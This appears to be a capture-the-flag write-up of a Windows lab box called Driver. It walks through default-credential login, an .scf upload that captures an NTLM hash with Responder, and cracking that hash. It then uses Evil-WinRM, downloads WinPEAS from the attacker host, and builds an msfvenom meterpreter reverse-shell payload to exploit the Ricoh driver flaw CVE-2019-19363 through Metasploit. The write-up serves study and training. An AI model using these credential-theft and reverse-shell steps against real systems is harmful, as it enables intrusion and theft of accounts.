+++
date = '2026-08-28T11:56:26+02:00'
draft = false
title = 'Driver Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`22/03/2025`**

![pwn.png](/images/imgs_driver/pwn.png)

---
# Introduction

**_Driver_** is an **Easy-level Windows** box that highlights the dangers of misconfigured file shares and outdated drivers.

The initial foothold relies on guessing default credentials for a web-based printer management portal. By abusing a firmware upload feature that interacts with a backend file share, we can upload a malicious **`.scf`** file to force an authentication attempt and capture an **NTLM hash**. After cracking the hash to gain **WinRM** access, the privilege escalation involves identifying an outdated **Ricoh** printer driver vulnerable to **CVE-2019-19363**, requiring a pivot to **Metasploit** and careful process migration to achieve a stable **Administrator** shell.

---
# Techniques Used

- **Malicious File Upload (.scf)**

- **NTLM Hash Capture**

- **Password Cracking**

- **Privesc via Printer Driver Exploitation (CVE-2019-19363)**

---
# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- driver -Pn
```

```text
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman
7680/tcp open  pando-pub
```

Targeted scan with scripts and version detection:

```bash
nmap -sC -sV driver -Pn
```

```text
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)                  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                          
|_http-server-header: Microsoft-HTTPAPI/2.0 
|_http-title: Not Found                        
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:                             
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s                                
| smb-security-mode:|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-08-27T21:19:01
|_  start_date: 2026-08-27T21:17:33
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

**Open ports**:

- **80**/tcp - HTTP (IIS)

- **135**/tcp - MSRPC

- **445**/tcp - SMB

- **5985**/tcp - WinRM

- **7680**/tcp - Pando-pub

## Web Enumeration

On the webpage (port **80**) a simple login form.

![web1.png](/images/imgs_driver/web1.png)

Since the second **nmap** scan output explicitly leaked "**`Please enter password for admin`**", I reasonably guessed the username was **admin**.

![pass.png](/images/imgs_driver/pass.png)

I usually don't like to guess, so I initially intercepted a request with **Burp Suite** to see how it parsed parameters, planning to pass it to **Hydra** for a brute-force attack. The request wasn't displaying the parameters clearly. Before moving on to enumerate other services, I decided to manually try a few basic combinations: **`admin:password`**, **`admin:root`**, and **`admin:admin`**.

I got a hit with **`admin:admin`**.

![logged.png](/images/imgs_driver/logged.png)

The page hosted an **MFP Firmware Update Center**. An email on the page leaked the domain **`driver.htb`**, which I added to my **`/etc/hosts`** file.

---
# Initial Access | NTLM Capture to WinRM

The only functional button on the portal was **`Firmware Update`**. It prompted me to "**Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.**"

![upload.png](/images/imgs_driver/upload.png)

At first, my mind went straight to a webshell. But one specific detail changed my entire approach: the phrase "**to our file share**".

If the upload form accepted any file type, I could potentially force the server to authenticate back to me and steal its **NTLM hash**. I initially tried to enumerate the **SMB** shares directly, as having anonymous or guest write access would make the process much faster, but anonymous login was disabled.

I decided to generate a batch of malicious files using **`ntlm_theft.py`** and test them one by one through the upload form.

**Source**: https://github.com/Greenwolf/ntlm_theft

```bash
python3 ntlm_theft.py -g all -s 10.10.15.152 -f fall
```

![theft.png](/images/imgs_driver/theft.png)

I started with the **`.scf`** payload since it was the first in the list. The form successfully accepted the file. With **Responder** actively listening on my machine, I almost instantly caught an **NTLMv2 hash** for the user **`tony`**.

```bash
sudo responder -I tun0
```

![ntlm.png](/images/imgs_driver/ntlm.png)

I saved the hash to a file and cracked it using **John the Ripper** and the rockyou wordlist:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![john.png](/images/imgs_driver/john.png)

The password cracked quickly: **`liltony`**.

To validate the credentials, I ran a quick **RID brute-force** over **SMB** just to check for extra details, but got no results:

```bash
nxc smb driver -u tony -p liltony --rid-brute
```

![rid.png](/images/imgs_driver/rid.png)

Next, I checked if the user had remote management privileges:

```bash
nxc winrm driver -u tony -p liltony
```

![tonypwn.png](/images/imgs_driver/tonypwn.png)

**`(Pwn3d!)`**. I connected using **Evil-WinRM** and grabbed the **user flag**.

```bash
evil-winrm -i driver -u tony -p liltony
```

![userf.png](/images/imgs_driver/userf.png)

---
# Privilege Escalation | CVE-2019-19363

I transferred **WinPEAS** to the target and executed it to look for local privilege escalation vectors.

```PowerShell
iwr -uri http://10.10.15.152:8000/winp.exe -O winp.exe
.\winp.exe
```

![winptransf.png](/images/imgs_driver/winptransf.png)

Nothing stood out immediately, and I found myself stuck for a while. Given the box's name is **_Driver_**, I decided to specifically filter the **WinPEAS** output for installed drivers and non-standard directories. I stumbled upon this:

![ricoh.png](/images/imgs_driver/ricoh.png)

I did some **Google** searching on this specific version of the **Ricoh** driver and found that it is vulnerable to **CVE-2019-19363**.

**Note**: _**CVE-2019-19363** is a local privilege escalation vulnerability caused by insecure file permissions in the **Ricoh** driver directory. Standard users have write access to this folder, allowing an attacker to drop a malicious payload that gets executed with **SYSTEM** privileges by the print spooler service._ 

Since I wasn't able to find a standalone **PoC** script to exploit this manually, the most reliable route was using a **Metasploit** module. To utilize it, I first needed to upgrade my standard **WinRM** session into a **Meterpreter** session.

I generated a **64-bit Windows meterpreter** executable on my **Kali** machine:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.152 LPORT=22667 -f exe > fall.exe
```

To transfer it, I simply used the native **Evil-WinRM** upload feature. Back on **Metasploit**, I configured the handler:

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 22667
run
```

I executed **`fall.exe`** on the target and caught the meterpreter shell. 

![meterpreter.png](/images/imgs_driver/meterpreter.png)

I backgrounded the session and loaded the specific **Ricoh** exploit module:

```bash
use exploit/windows/local/ricoh_driver_privesc
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 22666
exploit
```

![pending.png](/images/imgs_driver/pending.png)

I tried running it a few times, but it kept hanging right after the malicious printer creation step.

**Note**: _This kind of hanging usually happens when the exploit relies on a non-stable or low-privilege temporary process that crashes during execution. To fix this, you need to migrate to a highly stable, persistent process._

I checked the running processes and migrated my meterpreter session into **`OneDrive.exe`**, which is typically very stable on **Windows** environments. I reran the exploit module, and this time it successfully executed, dropping me into an **Administrator** shell.

![privesc.png](/images/imgs_driver/privesc.png)

I navigated to the **Administrator**'s desktop and grabbed the **root flag**.

![rootf.png](/images/imgs_driver/rootf.png)

---
# Final Thoughts

**_Driver_** is a solid box that heavily rewards attention to detail and reading the application's context clues ("**our file share**"). The initial access phase is a classic, realistic scenario showcasing how simple misconfigurations in file handlers can lead to complete credential compromise. The privilege escalation phase is a perfect example of how local vulnerabilities in forgotten printer drivers can be silently leveraged for a full system compromise.

**Sources**: 

- **NTLM Theft by Greenwolf | https://github.com/Greenwolf/ntlm_theft**
